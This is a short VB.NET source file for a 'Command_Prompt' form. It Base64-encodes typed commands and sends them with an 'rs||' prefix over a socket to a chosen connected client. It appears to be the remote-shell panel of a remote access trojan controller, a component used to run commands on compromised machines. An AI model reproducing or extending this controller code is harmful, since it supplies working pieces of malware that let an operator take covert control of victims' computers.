Imports System.Text

Public Class Command_Prompt

    Public sock As Integer
    Private A As String()
    Private idx As Integer
    Private it As Integer

    Private Sub T2_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles T2.KeyDown
        Select Case e.KeyCode
            Case Keys.Enter
                Dim text As String = T2.Text
                T2.Text = ""
                e.SuppressKeyPress = True
                Form1.s.Send(sock, "rs" & "||" & ENB([text]))
                Exit Select
        End Select
    End Sub
    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
    End Function

    Private Sub Command_Prompt_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        ' Me.Text &= "  For : " & Main.s.IP(sock)
    End Sub

  
    Private Sub T1_KeyDown(sender As System.Object, e As System.Windows.Forms.KeyEventArgs) Handles T1.KeyDown
        T2.Focus()
        T2.Text = LCase(e.KeyData)


    End Sub
End Class